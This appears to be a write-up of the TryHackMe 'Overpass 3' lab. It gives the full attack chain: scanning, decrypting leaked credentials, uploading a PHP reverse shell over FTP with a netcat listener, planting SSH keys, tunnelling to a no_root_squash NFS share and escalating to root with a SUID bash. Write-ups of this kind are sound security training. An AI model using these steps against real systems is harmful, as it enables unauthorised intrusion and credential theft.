# Overpass 3

🔗 Link to the CTF: [https://tryhackme.com/room/overpass3hosting](https://tryhackme.com/room/overpass3hosting)   
🌐 IP used for the machine: 10.10.226.107

## Port Scanning

Upon boot, the first thing I did was to scan the machine with nmap using:

`sudo nmap -sC -sV -v 10.10.226.107 -oN nmap/initialScan` to see common open ports.

`sudo namp -A -p- -v 10.10.226.107 -oN namp/allPortsScan` to scan all open ports in agressive mode.

After the scan, three ports are seen open:
- **21**: Running FTP. No anonymous login available.
- **22**: Running SSH.
- **80**: Running HTTP.

## Directory enumeration

Nothing interesting was found neither when visiting the site in 10.10.226.107, nor when looking at the source code.

I ran gobuster for directory enumeration with: `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.226.107` and found the following result:

    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.226.107
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2022/08/10 09:47:13 Starting gobuster in directory enumeration mode
    ===============================================================
    /backups              (Status: 301) [Size: 237] [--> http://10.10.226.107/backups/]

There exists a **backups** directory, and, inside it, a **backup.zip** file.

## The ZIP file

After downloading the file and unzziping it, two files are found:
    -rw-r--r-- 1 kali kali 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
    -rw------- 1 kali kali  3522 Nov  8  2020 priv.key

CustomerDetails.xlsx.gpg was encripted with GPG using the key priv.key. To decrypt it, we first impirt the key into gpg with `gpg --import priv.key` and decrypt the file with `gpg -d CustomerDetails.xlsx.gpg > CustomerDetails.xlsx`, outputting the result into the new file **CustomerDetails.xlsx**.

## FTP and getting a Reverse Shell

Inside the CustomerDetails.xlsx filewe find three customers with their usernames and passwords. So I tried them to login into the FTP, finding that I could do that for the user **paradox**.

After listing the files inside the FTP I found they were the same ones in the HTTP server:

    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
    -rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
    -rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
    -rw-r--r--    1 0        0             576 Nov 17  2020 main.css
    -rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
    226 Directory send OK.

So, to test this, I uploaded a PHP reverse shell (I used the one from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)) by running `ftp> put PATH_TO_REVERSE_SHELL`. I opened my netcat listener on port 8888 (that's the port I configured in the reverse shell) with `nc -lvnp 8888`. After accessing via HTTP 10.10.226.107/reverseShell.php got a conection.

## Web Flag

Running `id` on the reverse shell reveals that we are connected as `uid=48(apache) gid=48(apache) groups=48(apache)`. So, I ran `find / -name=*flag*` and found the flag at **/usr/share/httpd/web.flag**.

## User Flag

### Logging in as Paradox

Reading the `/etc/passwd` file reveals two interesting users: **paradox** and **james**. Since we have paradox's password for the FTP, I tried logging in as him with that password by running `su paradox`; it was successful.

After that, I tried to find the user's flag, but I couldnt do so with Paradox. The aim now is to login as james and see if he can access it.

### Connecting as paradox via SSH

Inside paradox's home directory we have access to the **.ssh** directory and with it to the SSH keys. I first created a new private/public SSH key pair with `ssh-keygen` and wrote the public key into the authorized_keys file with `cat id_rsa.pub >> authorized_keys`. I then copied the private key into my local machine in a file called **id_rsa_paradox** (I also chenged permissions to 600 with `chmod 600 id_rsa_paradox`) and coinnected via SSH using `ssh paradox@10.10.226.107 -i id_rsa_paradox`.

### Vulnerability enumeration with linpeas and explotation

The results of linpeas show an interesting vulnerability regarding NFS shares:

    ╔══════════╣ Analyzing NFS Exports Files (limit 70)
    -rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
    /home/james *(rw,fsid=0,sync,no_root_squash,insecure)

This indicates that James Homes directory can be accesed as a NFS share. However, trying to directly mount it in our local machine won't work because it is running on its localhost. Thus, we must make it accessible to us. What I did was to create an SSH tunnel for port forwarding, mapping port 4049 on my machine to port 2049 on the target machine (default port for NFS), with `ssh -L 4049:10.10.226.107:2049 paradox@10.10.226.107 -i id_rsa_paradox`.

To check this worked I scanned local port 4049 with `nmap -sV -p 4049 localhost`. The result was:

    PORT     STATE SERVICE VERSION
    4049/tcp open  nfs     3-4 (RPC #100003)

Now we can mount that directory. I created a directory called jamesHomeDir. In there I mounted James' home directory with: `sudo mount -t nfs -o port=4049 localhost:/ jamesHomeDir`.

### The User Flag

Inside this directory we will find the user flag.

## Logging in as James

Listing the contents of the mounted directory, we find the following:

    $ ls -al             
    total 20
    drwx------ 3 kali kali  112 Nov 17  2020 .
    drwxr-xr-x 7 kali kali 4096 Aug 10 13:42 ..
    lrwxrwxrwx 1 root root    9 Nov  8  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 kali kali   18 Nov  8  2019 .bash_logout
    -rw-r--r-- 1 kali kali  141 Nov  8  2019 .bash_profile
    -rw-r--r-- 1 kali kali  312 Nov  8  2019 .bashrc
    drwx------ 2 kali kali   61 Nov  7  2020 .ssh
    -rw------- 1 kali kali   38 Nov 17  2020 user.flag

We have access to the .ssh directory. We can grab james' private key and use it to log in as him via SSH.

## Privilege escalation

Once in, to escalate privileges, we will run bash as root. For that, the first thing will be to copy into james' home directory (the one we can access from our home machine) the bash file with `cp /usr/bin/bash /home/james` (**from the SSH session**). **In our local machine** we will change the ownership of the file, so that root owns it, and make it a SUID binary with:

    $ sudo chown root:root bash
    $ sudo chmod +s bash

After that, in the SSH session, as James, we will run that bash file with the **-p** flag: `./bash -p`. Running `id` shows we have root privileges: `uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),1000(james)`.

## Root Flag

Inside the root directory we'll find the root flag.
